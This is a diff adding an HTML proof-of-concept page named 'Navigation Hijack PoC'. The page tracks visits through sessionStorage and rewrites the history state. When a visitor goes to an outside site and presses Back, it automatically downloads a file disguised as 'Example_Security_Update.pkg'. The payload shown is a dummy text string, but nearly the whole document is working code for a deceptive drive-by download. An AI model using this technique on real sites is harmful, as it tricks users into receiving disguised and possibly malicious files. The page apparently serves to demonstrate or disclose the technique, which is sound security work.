@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Navigation Hijack PoC</title>
+
+    <!-- Disable cache -->
+    <meta
+      http-equiv="Cache-Control"
+      content="no-store, no-cache, must-revalidate, private"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+
+    <script>
+      /*
+      Logic Mapping:
+      - hasVisited (Express) -> sessionStorage
+      - / -> initial load
+      - /lure-page.html -> same file, different state
+      - /trigger-download -> JS-triggered download
+    */
+
+      if (!sessionStorage.getItem("hasVisited")) {
+        // First visit (equivalent to GET "/")
+        sessionStorage.setItem("hasVisited", "true");
+
+        // Fake redirect to lure page
+        history.replaceState({}, "", "?step=lure");
+      } else if (!location.search.includes("step=lure")) {
+        // User navigated BACK
+        triggerDownload();
+      }
+
+      window.onpageshow = function (e) {
+        if (e.persisted && sessionStorage.getItem("hasVisited") === "true") {
+          triggerDownload();
+        }
+      };
+
+      function triggerDownload() {
+        sessionStorage.removeItem("hasVisited");
+
+        const content = "This is a PoC dummy file simulating malware.";
+        const blob = new Blob([content], { type: "application/octet-stream" });
+
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "Example_Security_Update.pkg";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+    </script>
+  </head>
+
+  <body>
+    <h1>Step 1: Click the link below</h1>
+
+    <a href="https://www.example.com/en-us/"> Go to Example Site For PoC </a>
+
+    <p>Step 2: Once on Example Site, click the <b>BACK</b> button.</p>
+  </body>
+</html>
